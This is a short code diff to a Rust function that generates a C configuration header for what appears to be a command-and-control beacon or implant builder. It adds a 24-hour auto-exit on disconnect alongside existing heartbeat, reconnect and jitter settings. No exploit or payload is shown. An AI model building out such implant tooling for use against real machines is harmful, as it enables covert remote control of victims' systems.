@@ -313,9 +313,10 @@ fn generate_c_config(request: &BuildRequest) -> String {
 #define VERSION "1.0.0"
 
 // Beacon Configuration
-#define HEARTBEAT_INTERVAL 30 // seconds
-#define RECONNECT_DELAY 5     // seconds
-#define JITTER_PERCENT 20     // 0-100%
+#define HEARTBEAT_INTERVAL 30       // seconds
+#define RECONNECT_DELAY 5           // seconds
+#define JITTER_PERCENT 20           // 0-100%
+#define MAX_DISCONNECT_SECONDS 86400 // Auto-exit after 24h disconnect (0=disable)
 
 // Encryption Key (64 hex chars = 32 bytes)
 #define ENCRYPTION_KEY \
